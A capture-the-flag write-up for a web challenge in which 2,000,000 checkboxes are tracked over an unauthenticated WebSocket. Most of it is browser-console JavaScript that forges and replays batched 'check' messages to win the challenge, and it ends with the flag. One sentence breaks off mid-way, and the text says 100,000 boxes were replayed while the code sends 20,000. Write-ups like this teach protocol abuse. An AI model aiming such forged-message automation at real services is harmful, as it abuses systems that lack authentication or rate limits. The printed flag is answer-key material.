
## Challenge
This challenge provided a frontend with 2,000,000 checkboxes and a WebSocket backend that tracks checked states server-side. The goal was to tick all 2 million checkboxes to reveal the flag.

The challenge relied on client-side checkbox interactions, but used WebSocket messages to actually track progress on the server.

This means: you didn’t have to click UI checkboxes, you only needed to send the right messages. The WebSocket accepted raw JSON messages with 

There was no authentication, rate-limiting, or replay protection and anyone could: **Connect directly, Forge messages or even Automate the interaction**

## Solution

We scripted a solution in the browser’s console that:
- Sent batches of 20,000 checkbox indices
- Used localStorage to track progress
- Automatically resumed if interrupted
- After sending all 2 million, the server would respond with the flag or set it in window.SERVER_FLAG

```js
let ws;
let index = parseInt(localStorage.getItem("progress") || "0", 10);
const total = 2_000_000;
const batchSize = 20000;
const delay = 250;
let reconnectAttempts = 0;

function connectWebSocket() {
  ws = new WebSocket("ws://" + window.location.host + "/ws");

  ws.onopen = () => {
    console.log(`✅ Connected. Resuming at index ${index}`);
    reconnectAttempts = 0;
    sendNextBatch();
  };

  ws.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      if (data.flag) {
        console.log("🎉 FLAG:", data.flag);
        alert("🎉 FLAG: " + data.flag);
      } else {
        console.log("📩 Server response:", data);
      }
    } catch (e) {
      console.warn("⚠️ Non-JSON message:", event.data);
    }
  };

  ws.onclose = () => {
    console.warn("❌ WebSocket closed. Reconnecting...");
    reconnectAttempts++;
    const backoff = Math.min(2000 * reconnectAttempts, 10000);
    setTimeout(connectWebSocket, backoff);
  };

  ws.onerror = (err) => {
    console.error("🚨 WebSocket error:", err);
    ws.close();
  };
}

function sendNextBatch() {
  if (ws.readyState !== WebSocket.OPEN) {
    console.warn("⚠️ WebSocket not open. Skipping batch.");
    return;
  }

  if (index >= total) {
    console.log("✅ All 2 million checkboxes sent!");
    return;
  }

  const numbers = [];
  for (let i = index; i < Math.min(index + batchSize, total); i++) {
    numbers.push(i);
  }

  ws.send(JSON.stringify({ action: "check", numbers }));
  localStorage.setItem("progress", index);

  if (index % 100000 === 0) {
    console.log(`📦 Progress: ${index.toLocaleString()} / ${total.toLocaleString()}`);
  }

  console.log(`✅ Sent ${numbers.length} checkboxes: ${index} to ${index + numbers.length - 1}`);
  index += batchSize;

  setTimeout(sendNextBatch, delay);
}

connectWebSocket();
```
Due to network or timing issues, some final batches didn’t register. We resolved this by replaying the final 100,000 checkboxes and manually triggering a state check.

```js
const ws2 = new WebSocket("ws://" + window.location.host + "/ws");

ws2.onopen = () => {
  const numbers = [];
  for (let i = 1980000; i < 2000000; i++) {
    numbers.push(i);
  }

  ws2.send(JSON.stringify({
    action: "check",
    numbers
  }));

  console.log("✅ Final batch sent: 1,980,000 to 1,999,999");

  setTimeout(() => {
    ws2.send(JSON.stringify({ action: "get_state" }));
  }, 500);
};

ws2.onmessage = (event) => {
  try {
    const data = JSON.parse(event.data);
    console.log("📩 Server says:", data);
    if (data.flag) {
      alert("🎉 FLAG: " + data.flag);
    }
  } catch (e) {
    console.warn("⚠️ Could not parse message:", event.data);
  }
};
```

## Flag
Once the server verified all checkboxes were checked, it revealed the flag through the WebSocket or the DOM.

```
flag{7d798903eb2a1823803a243dde6e9d5b}
```
